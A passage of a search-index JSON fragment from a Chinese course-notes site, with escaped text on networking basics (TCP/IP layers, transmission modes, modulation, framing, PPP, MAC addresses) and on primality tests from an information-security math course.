<p>\u51fa\u73b0\u4f20\u8f93\u5dee\u9519\u5982\u4f55\u5904\u7406\uff08\u53ef\u9760\u4f20\u8f93\u548c\u4e0d\u53ef\u9760\u4f20\u8f93\uff09</p> </li> <li> <p>\u5e94\u7528\u5c42</p> </li> <li> <p>\u901a\u8fc7\u5e94\u7528\u8fdb\u7a0b\u4e4b\u95f4\u7684\u7f51\u7edc\u4ea4\u4e92\u5b8c\u6210\u7279\u5b9a\u7684\u7f51\u7edc\u5e94\u7528</p> </li> <li> <p>\u8fdb\u884c\u4f1a\u8bdd\u7ba1\u7406\u548c\u6570\u636e\u8868\u793a</p> </li> <li> <p>\u603b\u7ed3</p> </li> </ol> \u5c42\u7ea7 \u529f\u80fd \u5e94\u7528\u5c42 \u89e3\u51b3\u901a\u8fc7\u5e94\u7528\u8fdb\u7a0b\u7684\u4ea4\u4e92\u5b9e\u73b0\u7279\u5b9a\u7f51\u8def\u5e94\u7528\u7684\u95ee\u9898 \u4f20\u8f93\u5c42 \u89e3\u51b3\u8fdb\u7a0b\u4e4b\u95f4\u57fa\u4e8e\u7f51\u7edc\u7684\u901a\u4fe1\u95ee\u9898 \u7f51\u9645\u5c42 \u89e3\u51b3\u6570\u636e\u5305\u5728\u591a\u4e2a\u7f51\u7edc\u4e4b\u95f4\u4f20\u8f93\u548c\u8def\u7531\u7684\u95ee\u9898 \u6570\u636e\u94fe\u8def\u5c42 \u89e3\u51b3\u6570\u636e\u5305\u5728\u4e00\u4e2a\u7f51\u7edc\u6216\u4e00\u6bb5\u94fe\u8def\u4e0a\u4f20\u8f93\u7684\u95ee\u9898 \u7269\u7406\u5c42 \u89e3\u51b3\u4f7f\u7528\u4f55\u79cd\u4fe1\u53f7\u6765\u8868\u793a\u6bd4\u7279\u6d41\u7684\u95ee\u9898 <ul> <li>\u901a\u4fe1\u7684\u5177\u4f53\u8fc7\u7a0b</li> </ul> <pre><code>graph TD\n\nsubgraph DATA\na[HTTP\u8bf7\u6c42\u62a5\u6587]--&gt;b[HTTP\u8bf7\u6c42\u62a5\u6587+TCP\u9996\u90e8=TCP\u62a5\u6587\u6bb5]--&gt;c[TCP\u62a5\u6587\u6bb5+IP\u9996\u90e8=IP\u6570\u636e\u62a5]--&gt;d[IP\u6570\u636e\u62a5+\u4ee5\u592a\u7f51\u9996\u5c3e\u90e8=\u4ee5\u592a\u7f51\u5e27]--&gt;e[\u8f6c\u6362\u4e3a\u6bd4\u7279\u6d41]\nend\nsubgraph TCP/IP\nz[\u5e94\u7528\u5c42]--&gt;2[\u4f20\u8f93\u5c42]--&gt;3[\u7f51\u9645\u5c42]--&gt;4[\u6570\u636e\u94fe\u8def\u5c42]--&gt;5[\u7269\u7406\u5c42]\nend\n</code></pre> <p>\u8fd9\u662f\u5bf9\u4e8e\u4e3b\u673a\u901a\u4fe1\u662f\u6240\u7ecf\u5386\u7684\u8fc7\u7a0b\uff0c\u5bf9\u4e8e\u63a5\u6536\u65b9\u5219\u4e3a\u5176\u9006\u8fc7\u7a0b\u3002</p> <p>\u800c\u5bf9\u4e8e\u4ea4\u6362\u673a\u5f80\u5f80\u53ea\u6709\u6700\u4e0b\u9762\u4e09\u5c42\uff0c\u4e5f\u5c31\u662f\u53ea\u6709\u4ee5\u592a\u7f51\u9996\u5c3e\u90e8\u3001IP\u89e3\u6790\u548c\u5c01\u88c5\u3002\u8fd9\u4e5f\u540c\u65f6\u4fdd\u8bc1\u4e86\u8f6c\u53d1\u6570\u636e\u7684\u5b89\u5168\u6027\u3002</p>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#_4","title":"\u7f51\u7edc\u4f20\u8f93","text":""},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#_5","title":"\u4f20\u8f93\u65b9\u5f0f","text":"<ol> <li>\u4e32\u884c\u4f20\u8f93\uff1a\u4f20\u8f93\u53ea\u6709\u4e00\u6761\u7ebf\u8def\uff0c\u7ed3\u6784\u7b80\u5355\uff0c\u6210\u672c\u4f4e\uff0c\u652f\u6301\u70ed\u62d4\u63d2\uff0c\u9002\u5408\u957f\u8ddd\u79bb\u4f20\u8f93\u3002\u5e38\u89c1\u7684\u4e32\u884c\u63a5\u53e3\u6709\uff1a</li> <li>SATA\u63a5\u53e3\uff1a\u8ba1\u7b97\u673a\u603b\u7ebf\u4e4b\u4e00\uff0c\u76f8\u5bf9\u4e8ePATA\u6709\u8f83\u5f3a\u7684\u6570\u636e\u7ea0\u9519\u80fd\u529b\uff0c\u53ef\u901a\u8fc7\u63d0\u9ad8\u9891\u7387\u6765\u63d0\u5347\u4f20\u8f93\u6548\u7387\uff0c\u7528\u4e8e\u4e3b\u677f\u548c\u5927\u91cf\u5b58\u50a8\u8bbe\u5907\uff08\u5982\u786c\u76d8\u3001\u5149\u9a71\u7b49\uff09\u4e4b\u95f4\u7684\u6570\u636e\u4f20\u8f93\u3002</li> <li>PCI E\u63a5\u53e3\uff1a\u8ba1\u7b97\u673a\u603b\u7ebf\u4e4b\u4e00\uff0c\u901f\u5ea6\u6bd4SATA\u63a5\u53e3\u5feb\uff0c\u5e38\u7528\u4e8e\u5916\u63a5\u663e\u5361\uff0c\u9ad8\u9891\u7f51\u5361\u7b49\u3002</li> <li>USB\u63a5\u53e3\uff1a\u8ba1\u7b97\u673a\u6700\u5e38\u89c1\u7684\u4e0e\u5916\u8bbe\u8fde\u63a5\u7684\u63a5\u53e3\u3002</li> <li>COM\u4e32\u884c\u63a5\u53e3\uff1a\u8fd9\u79cd\u63a5\u53e3\u73b0\u5728\u57fa\u672c\u5df2\u88abUSB\u63a5\u53e3\u4ee3\u66ff\uff0c\u5e38\u7528\u4e8e\u8001\u5b9e\u663e\u793a\u5668\uff0c\u8001\u5f0f\u6253\u5370\u673a\u7684\u8fde\u63a5\u3002</li> <li>\u5e76\u884c\u63a5\u53e3\uff1a\u4f20\u8f93\uff1b\u6709\u591a\u6761\u7ebf\u8def\uff0c\u4f20\u8f93\u901f\u5ea6\u5feb\uff0c\u6548\u7387\u9ad8\uff0c\u4f46\u662f\u6210\u672c\u76f8\u5bf9\u8f83\u9ad8\uff0c\u4e14\u4e00\u822c\u88ab\u9650\u5b9a\u9891\u7387\uff0c\u4e00\u822c\u7528\u4e8e\u8ba1\u7b97\u673a\u5185\u90e8\u7684\u6570\u636e\u4ea4\u6362\u4f20\u8f93\uff0c\u5e38\u89c1\u7684\u5e76\u884c\u63a5\u53e3\u6709\uff1a</li> <li>PATA\u63a5\u53e3\uff1a\u5e76\u884c\u9ad8\u7ea7\u6280\u672f\u9644\u4ef6\u63a5\u53e3\uff0c\u53ef\u7528\u4e8e\u8fde\u63a5\u786c\u76d8\u3001\u5149\u9a71\u3001\u8fde\u63a5\u6253\u5370\u673a\u3001\u626b\u63cf\u4eea\u7b49\uff0c\u867d\u7136\u662f\u662f\u5e76\u884c\u63a5\u53e3\uff0c\u4f46\u662f\u901f\u5ea6\u4e0a\u9650\u8fdc\u8d76\u4e0d\u4e0aSATA\u3002</li> <li> <p>PCI\u63a5\u53e3\uff1aPCI E\u63a5\u53e3\u7684\u524d\u751f\uff0c\u7528\u4e8e\u63d2\u63a5\u5916\u7f6e\u7f51\u5361\u3001\u58f0\u5361\u3001\u663e\u5361\u548c\u8c03\u5236\u89e3\u8c03\u5668\u5361\u7b49\u3002</p> </li> <li> <p>\u7f51\u5361\u7684\u4e32\u5e76\u8f6c\u6362</p> </li> </ol> <p>\u7f51\u5361\u548c\u5c40\u57df\u7f51\u4e4b\u95f4\u7684\u901a\u4fe1\u662f\u901a\u8fc7\u7535\u7f06\u6216\u53cc\u7ede\u7ebf\u4ee5\u4e32\u884c\u4f20\u8f93\u65b9\u5f0f\u8fdb\u884c\u7684(\u7269\u7406\u5c42)\u3002\u800c\u7f51\u5361\u548c\u8ba1\u7b97\u673a\u4e4b\u95f4\u7684\u901a\u4fe1\u5219\u662f\u901a\u8fc7\u8ba1\u7b97\u673a\u4e3b\u677f\u4e0a\u7684I/O\u603b\u7ebf\u4ee5\u5e76\u884c\u4f20\u8f93\u65b9\u5f0f\u8fdb\u884c(\u6570\u636e\u94fe\u8def\u5c42)\u3002\u56e0\u6b64\uff0c\u7f51\u5361\u7684\u4e00\u4e2a\u91cd\u8981\u529f\u80fd\u5c31\u662f\u8981\u8fdb\u884c\u4e32\u884c/\u5e76\u884c\u8f6c\u6362\u3002</p> <p>\u4e32\u884c\u548c\u5e76\u884c\u54ea\u4e2a\u901f\u5ea6\u66f4\u5feb\uff0c\u8c01\u4e5f\u8bf4\u4e0d\u51c6\uff0c\u8fd9\u4e3b\u8981\u548c\u6280\u672f\u7684\u53d1\u5c55\u6709\u5173\uff0c\u800c\u5728\u8ba1\u7b97\u673a\u5185\u90e8\u91c7\u7528\u5e76\u884c\u901f\u5ea6\u76f8\u5bf9\u4f1a\u66f4\u5feb\u4e00\u70b9\uff0c\u56e0\u4e3a\u8ba1\u7b97\u673a\u5185\u90e8\u7684\u6570\u636e\u4f20\u8f93\u5bf9\u68c0\u9519\u7684\u8981\u6c42\u66f4\u5c11\uff0c\u800c\u4e14\u8ba1\u7b97\u673a\u5185\u90e8\u7684\u6570\u636e\u5f80\u5f80\u662f\u65ad\u65ad\u7eed\u7eed\u7684\uff0c\u4e0d\u60f3\u7f51\u7edc\u4f20\u8f93\uff0c\u4e00\u822c\u90fd\u662f\u8fde\u7eed\u7684\uff08\u5373\u4f7f\u662f\u62a5\u6587\u4f20\u8f93\uff0c\u6bcf\u4e2a\u62a5\u6587\u7684\u6570\u636e\u91cf\u4e5f\u662f\u76f8\u5bf9\u6bd4\u8f83\u5927\u7684\uff09</p>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#_6","title":"\u540c\u6b65\u4f20\u8f93\u548c\u5f02\u6b65\u4f20\u8f93","text":"<ol> <li>\u540c\u6b65\u4f20\u8f93\uff1a\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\uff0c\u4e0a\u4e00\u6bb5\u7684\u62a5\u6587\u7684\u7ed3\u675f\u7d27\u63a5\u7740\u4e0b\u4e00\u6bb5\u5305\u6587\u7684\u5f00\u59cb\uff0c\u4e2d\u95f4\u4e0d\u95f4\u65ad\uff0c\u4e5f\u5c31\u662f\u7f51\u5361\u4e00\u76f4\u5bf9\u5916\u53d1\u9001\u6570\u636e\uff0c\u77e5\u9053\u6570\u636e\u53d1\u9001\u5b8c\u6210\u3002\u7531\u4e8e\u540c\u6b65\u4f20\u8f93\u5728\u4f20\u8f93\u8fc7\u7a0b\u4e2d\u53ef\u80fd\u51fa\u73b0\u9519\u8bef\uff0c\u4e5f\u6709\u53ef\u80fd\u5e94\u4e3a\u6536\u53d1\u53cc\u65b9\u65f6\u949f\u672a\u540c\u6b65\uff0c\u5bfc\u81f4\u63a5\u6536\u5230\u9519\u8bef\u4fe1\u606f\uff0c\u56e0\u6b64\u5e38\u5e38\u8981\u6c42\u6dfb\u52a0\u540c\u6b65\u529f\u80fd\uff1a</li> <li>\u5185\u540c\u6b65\uff1a\u5728\u6e90\u6570\u636e\u4e2d\u7684\u6bcf\u4e00\u6bb5\u5185\u52a0\u5165\u65f6\u949f\u4fe1\u606f\uff0c\u5982\u66fc\u5f7b\u65af\u7279\u7f16\u7801\u548c\u5dee\u5206\u66fc\u5f7b\u65af\u7279\u7f16\u7801\uff1b</li> <li>\u5916\u540c\u6b65\uff1a\u989d\u5916\u6dfb\u52a0\u4e00\u6761\u7528\u4e8e\u65f6\u949f\u540c\u6b65\u7684\u4f20\u8f93\u7ebf\u8def\u3002</li> <li>\u5f02\u6b65\u4f20\u8f93\uff1a\u4ee5\u5b57\u8282\u4e3a\u5355\u4f4d\uff0c\u6bcf\u4e2a\u5b57\u8282\u5185\u90e8\u91c7\u7528\u540c\u6b65\u4f20\u8f93\u7684\u65b9\u5f0f\uff0c\u800c\u6bcf\u4e2a\u5b57\u8282\u4e4b\u95f4\u5219\u76f8\u4e92\u72ec\u7acb\uff0c\u53ef\u4ee5\u95f4\u9694\u65f6\u95f4\u4e0d\u4e00\u3002\u4e3a\u4e86\u65b9\u4fbf\u63a5\u6536\u65b9\u5f0f\u5457\uff0c\u4e00\u822c\u8981\u7ed9\u6bcf\u4e2a\u5b57\u8282\u6dfb\u52a0\u8d77\u59cb\u4f4d\u548c\u7ed3\u675f\u4f4d\u3002</li> </ol>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#_7","title":"\u5355\u5411\u901a\u4fe1\uff0c\u53cc\u5411\u4ea4\u66ff\u901a\u4fe1\uff0c\u53cc\u5411\u540c\u65f6\u901a\u4fe1","text":"<ol> <li> <p>\u5355\u5411\u901a\u4fe1\uff08\u5e7f\u64ad\u901a\u4fe1\uff09\uff1a\u53ea\u6709\u4e00\u65b9\u53d1\u9001\uff0c\u53e6\u4e00\u65b9\u63a5\u53d7\uff0c\u6ca1\u6709\u5efa\u7acb\u8fde\u63a5\uff0c\u53d1\u9001\u65b9\u4e0d\u77e5\u9053\u63a5\u6536\u65b9\u7684\u5b58\u5728\u3002\u5982\u6536\u97f3\u673a\uff0c\u7535\u89c6\u5e7f\u64ad\u7b49\uff1b</p> </li> <li> <p>\u53cc\u5411\u4ea4\u66ff\u901a\u4fe1\uff08\u534a\u53cc\u5de5\u901a\u4fe1\uff09\uff1a\u53d1\u9001\u548c\u63a5\u53d7\u4ea4\u66ff\u8fdb\u884c\uff0c\u4e5f\u5c31\u662f\u901a\u4fe1\u53cc\u65b9\u8f6e\u6d41\u6536\u53d1\uff0c\u901a\u4fe1\u53cc\u65b9\u662f\u53ef\u4ee5\u77e5\u9053\u5bf9\u65b9\u7684\u5b58\u5728\u7684\u3002\u5982\u5bf9\u8bb2\u673a\uff0c\u603b\u7ebf\u5f0f\u4ee5\u592a\u7f51\u7b49\uff1b</p> </li> <li> <p>\u53cc\u5411\u540c\u65f6\u901a\u4fe1\uff08\u5168\u53cc\u5de5\u901a\u4fe1\uff09\uff1a\u53d1\u9001\u548c\u63a5\u6536\u53ef\u4ee5\u540c\u65f6\u8fdb\u884c\uff0c\u5982\u4ea4\u6362\u5f0f\u4ee5\u592a\u7f51\u7684\u5404\u4e3b\u673a\u4e4b\u95f4\uff0c\u4f20\u7edf\u7535\u8bdd\u4e4b\u95f4\u7b49\u3002</p> </li> </ol> <p>\u867d\u7136HTTP\u662f\u57fa\u4e8eTCP\u7684\u5f15\u7528\u5c42\u4f20\u8f93\u534f\u8bae\uff0c\u4f46\u662fHTTP\u662f\u534a\u53cc\u5de5\u7684\uff0c\u4e5f\u5c31\u662f\u53cc\u5411\u4ea4\u66ff\u901a\u4fe1\uff0c\u8bf7\u6c42\u548c\u54cd\u5e94\u5f02\u6b65\u4f20\u8f93\u3002\u800c\u540e\u4ea7\u751f\u7684WebSocket\u4e5f\u662f\u57fa\u4e8eTCP\u7684\uff0c\u4f46\u4ed6\u662f\u5168\u53cc\u5de5\uff0c\u4f20\u8f93\u901f\u5ea6\u66f4\u5feb\uff0c\u7f51\u7edc\u5229\u7528\u7387\u66f4\u9ad8\uff0c\u800c\u4e14\u517c\u5bb9\u534a\u53cc\u5de5\uff0c\u4e5f\u5c31\u662f\u53ef\u4ee5\u5f53\u505a\u534a\u53cc\u5de5\u7684HTTP\u4f7f\u7528\u3002</p>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#_8","title":"\u7f16\u7801\u548c\u8c03\u5236","text":""},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#_9","title":"\u7f16\u7801\u8fc7\u7a0b","text":"<pre><code>graph LR\n\u6d88\u606f--&gt;\u6570\u636e--&gt;\u4fe1\u53f7--&gt;\u6570\u5b57\u57fa\u5e26\u4fe1\u53f7--&gt;\u57fa\u5e26\u8c03\u5236--&gt;\u6570\u5b57\u4fe1\u9053\n\u6570\u5b57\u57fa\u5e26\u4fe1\u53f7--&gt;\u5e26\u901a\u8c03\u5236--&gt;\u6a21\u62df\u4fe1\u9053\n</code></pre> <p>\u5e38\u89c1\u7684\u57fa\u5e26\u8c03\u5236\u6709\u66fc\u5f7b\u65af\u7279\u7f16\u7801\uff0c\u5dee\u5206\u66fc\u5f7b\u65af\u7279\u7f16\u7801\u7b49</p> <p>\u5e38\u89c1\u7684\u5e26\u901a\u8c03\u5236\u6709WIFI\u7684CCF\u7f16\u7801</p>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#_10","title":"\u57fa\u5e26\u8c03\u5236","text":"<ol> <li>\u66fc\u5f7b\u65af\u7279\u7f16\u7801\uff1a\u7801\u5143\u4e2d\u7684\u4fe1\u53f7\u9ad8\u9891\u5230\u4f4e\u9891\u548c\u4f4e\u9891\u5230\u9ad8\u9891\u7684\u53d8\u5316\u8868\u793a\u6bd4\u7279\u5185\u5bb9</li> <li>\u5dee\u5206\u66fc\u5f7b\u65af\u7279\u7f16\u7801\uff1a\u5728\u6bcf\u4e2a\u7801\u5143\u7684\u5f00\u59cb\u662f\u5426\u6709\u53d8\u5316\u4fbf\u662f\u7801\u5143\u5185\u5bb9\uff0c\u7801\u5143\u5185\u90e8\u7684\u4fe1\u53f7\u53d8\u5316\u53ea\u8868\u793a\u65f6\u949f\u4fe1\u606f\u3002</li> </ol>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#_11","title":"\u5e26\u901a\u8c03\u5236","text":"<ul> <li>\u57fa\u672c\u5e26\u901a\u8c03\u5236\u65b9\u6cd5\uff1a</li> </ul> <ul> <li>\u6df7\u5408\u8c03\u5236\u65b9\u6cd5\uff1a</li> </ul> <p>\u7531\u4e8e\u9891\u7387\u548c\u76f8\u4f4d\u662f\u76f8\u5173\u7684\uff0c\u4e0d\u80fd\u6df7\u5408\u8c03\u5236\u3002\u5e38\u7528\u76f8\u4f4d\u548c\u632f\u5e45\u6df7\u5408\u8c03\u5236\uff0c\u5982\u5e38\u89c1\u7684\u6b63\u4ea4\u632f\u5e45\u8c03\u5236QAM\u3002</p>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#_12","title":"\u5c01\u88c5\u6210\u5e27\u548c\u900f\u660e\u4f20\u8f93","text":"<p>\u5c01\u88c5\u6210\u5e27\uff1a\u94fe\u8def\u5c42\u7684\u4f20\u8f93\u534f\u8bae\u5c06\u4e0a\u5c42\u7684\u6570\u636e\u5c01\u88c5\u6210\u5e27\uff0c\u5e76\u4ea4\u7ed9\u7269\u7406\u5c42\u4f20\u8f93\u3002</p> <p>\u900f\u660e\u4f20\u8f93\uff1a\u94fe\u8def\u5c42\u5bf9\u4e8e\u4e0a\u5c42\u6765\u8bb2\u6ca1\u6709\u4efb\u4f55\u6761\u4ef6\u9650\u5236\uff0c\u4e5f\u5c31\u662f\u65e0\u8bba\u4e0a\u5c42\u4f20\u9012\u4e2a\u4e0b\u5c42\u4ec0\u4e48\u6570\u636e\uff0c\u4e0b\u5c42\u90fd\u53ef\u4ee5\u5b9e\u73b0\u6b63\u786e\u7684\u4f20\u8f93\uff08\u8fd9\u5728\u5e95\u5c42\u5c42\u7ea7\u5f00\u53d1\u91cc\u9762\u662f\u5f88\u91cd\u8981\u7684\uff0c\u56e0\u4e3a\u4f60\u6c38\u8fdc\u4e5f\u65e0\u6cd5\u5b8c\u5168\u8003\u8651\u4e0a\u5c42\u672a\u6765\u7684\u53d1\u5c55\uff09</p> <p>\u539f\u7406\uff1a</p> <ul> <li>\u5728\u4e0a\u5c42\u4ea4\u4ed8\u7684PDU\uff08Package Date Unite\uff09\u524d\u540e\u6dfb\u52a0\u5f00\u59cb\u548c\u7ed3\u675f\u7684\u6807\u5fd7\u5b57\u6bb5</li> <li>\u5982\u679c\u5728PDU\u4e2d\u5b58\u5728\u5f00\u59cb\u6216\u7ed3\u675f\u7684\u6807\u5fd7\u5b57\u6bb5\uff0c\u5c31\u5bf9\u5176\u8fdb\u884c\u8f6c\u4e49\u5904\u7406\uff1a</li> <li>\u5b57\u8282\u586b\u5145\uff1a\u5728PDU\u4e2d\u7684\u6807\u5fd7\u5b57\u6bb5\u524d\u6dfb\u52a0\u7279\u5b9a\u7684\u5b57\u6bb5\u8868\u793a\u8f6c\u4e49\uff0c\u5bf9\u4e8ePDU\u4e2d\u548c\u8f6c\u4e49\u5b57\u6bb5\u91cd\u590d\u7684\uff0c\u4e5f\u540c\u6837\u5728\u4ed6\u524d\u9762\u6dfb\u52a0\u8f6c\u4e49\u5b57\u6bb5\u3002\u771f\u662f\u9762\u5411\u5b57\u8282\u4f20\u8f93\u7684\u5e38\u7528\u624b\u6bb5</li> <li>\u6bd4\u7279\u586b\u5145\uff1a\u5728PDU\u4e2d\u7684\u6807\u5fd7\u5b57\u6bb5\u5185\u90e8\u6dfb\u52a0\u7279\u5b9a\u6bd4\u7279\uff080&amp;1\uff09\uff0c\u4f7f\u4ed6\u5728\u63a5\u6536\u662f\u4e0d\u5f71\u54cd\u63a5\u6536\u65b9\u7684\u5224\u65ad\uff0c\u800c\u5728\u63a5\u6536\u65b9\uff0c\u53c8\u8981\u4f7f\u7528\u9006\u5411\u7684\u65b9\u6cd5\u5bf9\u5176\u8fdb\u884c\u89e3\u7801\u3002</li> </ul>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#_13","title":"\u8bef\u7801\u68c0\u6d4b","text":"<ol> <li>\u5947\u5076\u6821\u9a8c\uff1a\u5224\u65ad\u6bd4\u7279\u6d41\u4e2d\u76840\u548c1\u7684\u5947\u5076\u6027\uff0c\u4ece\u800c\u68c0\u6d4b\u51fa\u662f\u5426\u8bef\u7801\uff0c\u4f46\u8fd9\u79cd\u65b9\u6cd5\u53ef\u7528\u6027\u5dee\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u6070\u597d\u540c\u65f6\u6539\u53d8\u4e86\u5076\u6570\u4e2a\u6bd4\u7279\uff0c\u8fd9\u79cd\u65b9\u5f0f\u662f\u68c0\u6d4b\u4e0d\u51fa\u6765\u7684\u3002</li> <li>\u5faa\u73af\u5197\u4f59\u68c0\u9a8c\uff1a</li> </ol>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#ppppoint-to-point-protocol","title":"\u70b9\u5bf9\u70b9\u534f\u8baePPP\uff08Point-to-Point Protocol\uff09","text":"<p>\u70b9\u5bf9\u70b9\u534f\u8bae\u662f\u76ee\u524d\u4f7f\u7528\u6700\u5e7f\u6cdb\u7684\u70b9\u5bf9\u70b9\u6570\u636e\u94fe\u8def\u5c42\u534f\u8bae</p>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#_14","title":"\u70b9\u5bf9\u70b9\u534f\u8bae\u7684\u5185\u5bb9\uff1a","text":"<ul> <li>\u5bf9\u4e0b\u5c42\uff1a\u5bf9\u5404\u79cd\u534f\u8bae\u6570\u636e\u62a5\u7684\u5c01\u88c5\uff08\u5c01\u88c5\u6210\u5e27\uff09</li> <li>\u5bf9\u81ea\u8eab\uff1a\u94fe\u8def\u63a7\u5236\u534f\u8baeLCP\uff08\u7528\u4e8e\u5efa\u7acb\u3001\u914d\u7f6e\u4ee5\u53ca\u6d4b\u8bd5\u6570\u636e\u94fe\u8def\u5c42\u7684\u8fde\u63a5\uff09</li> <li>\u5bf9\u4e0a\u5c42\uff1a\u4e00\u5957\u7f51\u7edc\u63a7\u5236\u534f\u8bae\u65cfNCPs\uff08\u5176\u4e2d\u7684\u6bcf\u4e00\u534f\u8bae\u652f\u6301\u4e0d\u540c\u7684\u7f51\u7edc\u5c42\u534f\u8bae\uff09</li> </ul>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#_15","title":"\u70b9\u5bf9\u70b9\u534f\u8bae\u7684\u62a5\u6587\u683c\u5f0f","text":""},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#_16","title":"\u900f\u660e\u4f20\u8f93\u7684\u5177\u4f53\u5b9e\u73b0","text":"<ul> <li>\u9762\u5411\u5b57\u8282\u4f20\u8f93\uff1a\u8f6c\u4e49\u65f6\u586b\u5145\u8f6c\u4e49\u5b57\u501f</li> <li>\u9762\u5411\u6bd4\u7279\u4f20\u8f93\uff1a\u8f6c\u4e49\u65f6\u586b\u5145\u8f6c\u4e49\u6bd4\u7279\u3001</li> </ul>"},{"location":"course/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/#_17","title":"\u5171\u4eab\u5f0f\u4ee5\u592a\u7f51","text":"<p>MAC\u5730\u5740\uff08Media Access Controller Address\uff09</p> <p>IEEE802\u534f\u8bae\u4e2d\u7684MAC\u5730\u5740\u683c\u5f0f\uff1a</p> <p>\u4e00\u5171\u6709\u516d\u4e2a\u5b57\u8282\uff0c\u524d\u4e09\u4e2a\u5b57\u8282\u7528\u6765\u8868\u793a\u5382\u5546\uff0c\u540e\u4e09\u4e2a\u5b57\u8282\u7528\u6765\u6807\u8bc6\u4e0d\u540c\u7684\u8bbe\u5907\u3002MAC\u662f\u4ed8\u8d39\u7684\u3002</p> <p></p>"},{"location":"course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/%E7%AC%AC%E4%BA%94%E7%AB%A0-%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B/","title":"\u300a\u7d20\u6027\u68c0\u6d4b\u300b","text":"<pre><code>mindmap\n    root(\u7d20\u6570\u5224\u522b))\n        ))\u7b80\u5355\u7d20\u6570\u5224\u522b))\n        ::icon(fa fa-book)\n            \u6574\u6570\u5224\u522b\u6cd5\n            \u9636\u4e58\u5224\u522b\u6cd5\n        ))\u7d20\u6570\u7684\u786e\u5b9a\u5224\u522b\u6cd5))\n        ::icon(fa fa-book)\n            \u83b1\u6885\u5224\u522b\u6cd5\n            \u666e\u5229\u5179\u5224\u522b\u6cd5\n            \u6ce2\u514b\u6797\u987f\u5224\u522b\u6cd5\n        ))\u62df\u7d20\u6570))\n        ::icon(fa fa-book)\n            \u8d39\u9a6c\u62df\u7d20\u6570\n            \u5361\u7c73\u6b47\u5c14\u6570\n            \u6b27\u62c9\u62df\u7d20\u6570\n            \u5f3a\u62df\u7d20\u6570\n</code></pre>"},{"location":"course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/%E7%AC%AC%E4%BA%94%E7%AB%A0-%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B/#_2","title":"\u7b80\u5355\u7d20\u6027\u68c0\u6d4b","text":""},{"location":"course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/%E7%AC%AC%E4%BA%94%E7%AB%A0-%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B/#_3","title":"\u6574\u6570\u9664\u6cd5\u5224\u522b","text":"<p>\u5982\u679c\\(n\\)\u4e0d\u80fd\u88ab\u5c0f\u4e8e\u7b49\u4e8e\\(\\sqrt{n}\\)\u7684\u6570\u6574\u9664\uff0c\u90a3\u4e48\\(n\\)\u662f\u4e00\u4e2a\u7d20\u6570</p>"},{"location":"course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/%E7%AC%AC%E4%BA%94%E7%AB%A0-%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B/#wilson","title":"Wilson\uff08\u9636\u4e58\uff09\u5224\u522b\u6cd5","text":"<p>\u8bbe\u6574\u6570\\(m \\gt 1\\)\uff0c\u5219\u5f53\u4e14\u4ec5\u5f53\\((m-1)!\\equiv -1\\pmod m\\) \u65f6 \\(m\\) \u4e3a\u7d20\u6570</p>"},{"location":"course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/%E7%AC%AC%E4%BA%94%E7%AB%A0-%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B/#_4","title":"\u7d20\u6570\u7684\u786e\u5b9a\u5224\u522b\u6cd5","text":""},{"location":"course/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E6%95%B0%E5%AD%A6%E5%9F%BA%E7%A1%80/%E7%AC%AC%E4%BA%94%E7%AB%A0-%E7%B4%A0%E6%80%A7%E6%A3%80%E6%B5%8B/#_5","title":"\u83b1\u6885\u5224\u522b\u6cd5","text":"<p>\u5bf9\u4e8e\u5947\u6570\\(m\\)\uff0c\u5c06\\(m-1\\)\u7d20\u6570\u5206\u89e3\u540e\u7684\u6bcf\u4e00\u4e2a\u7d20\u6570\\(p_i\\)\uff0c\u90fd\u80fd\u627e\u5230\u4e00\u4e2a\u6570\\(a_i\\)\uff0c\u6ee1\u8db3 $$ \\begin{cases} (a_i,m)=1\\\\ a_i^{m-1} \\equiv 1\\pmod m \\\\ a_i^{m-1\\over{p_i}}  \\not\\equiv  1\\pmod m  \\end{cases} $$ 